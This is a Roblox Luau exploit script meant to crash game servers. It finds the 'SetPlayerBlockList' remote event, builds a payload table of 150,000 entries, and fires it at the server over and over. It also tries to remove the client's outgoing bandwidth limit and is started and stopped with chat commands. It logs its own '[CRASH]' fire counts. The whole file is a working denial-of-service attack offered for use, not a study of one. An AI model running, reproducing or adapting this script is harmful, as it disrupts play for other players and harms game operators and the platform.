--!nonstrict
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

local player = Players.LocalPlayer

-- ═══════════ EXACT SAME AS ORIGINAL WORKING CONFIG ═══════════
local Children    = 150000
local FireBurst   = 1.5
local FrameDelay  = 0.125

local RemoteCandidates = {
    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
    { "ReplicatedStorage",       "SetPlayerBlockList" },
}
-- ══════════════════════════════════════════════════════════════

local running = false
local cache = nil
local remote = nil
local fires = 0
local errors = 0

local function resolve()
    for _, path in ipairs(RemoteCandidates) do
        local node, ok = game, true
        for i = 1, #path do
            local nxt = node:FindFirstChild(path[i])
            if not nxt then ok = false; break end
            node = nxt
        end
        if ok and node then
            if node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent") then
                return node, path[1] .. "/" .. path[2]
            end
        end
    end
    return nil, "not found"
end

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

local function build()
    local root = table.create(Children)
    for i = 1, Children do
        root[i] = { id = i, v = i * 2 }
    end
    return root
end

local function runLoop()
    cache = build()
    print("[CRASH] payload built:", #cache, "entries")

    while running do
        if not remote then
            local r, where = resolve()
            remote = r
            if r then
                print("[CRASH] remote found:", where)
            else
                print("[CRASH] remote NOT FOUND — waiting")
            end
        end

        if remote then
            local ok = pcall(function()
                for _ = 1, FireBurst do
                    remote:FireServer(cache)
                end
            end)
            if ok then
                fires += 1
                errors = 0
            else
                errors += 1
                remote = nil
            end
        end

        task.wait(FrameDelay)
    end
end

local function start()
    if running then return end
    running = true
    remote = nil
    fires = 0
    errors = 0
    task.spawn(runLoop)
    print("[CRASH] STARTED")
end

local function stop()
    if not running then return end
    running = false
    cache = nil
    remote = nil
    print("[CRASH] STOPPED — total fires:", fires)
end

-- telemetry
task.spawn(function()
    local last = 0
    while true do
        task.wait(5)
        if running then
            local delta = fires - last
            last = fires
            print(string.format("[CRASH] fires=%d (+%d/5s) errors=%d remote=%s",
                fires, delta, errors, remote and "yes" or "NO"))
        else
            last = 0
        end
    end
end)

local started = false

local function onMessage(msg)
    local m = tostring(msg or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
    if m == "!start" and not started then
        started = true
        pcall(start)
    elseif m == "!stop" and started then
        started = false
        pcall(stop)
    end
end

pcall(function() player.Chatted:Connect(onMessage) end)
pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        if not message.TextSource then return end
        if message.TextSource.UserId ~= player.UserId then return end
        onMessage(message.Text)
    end)
end)
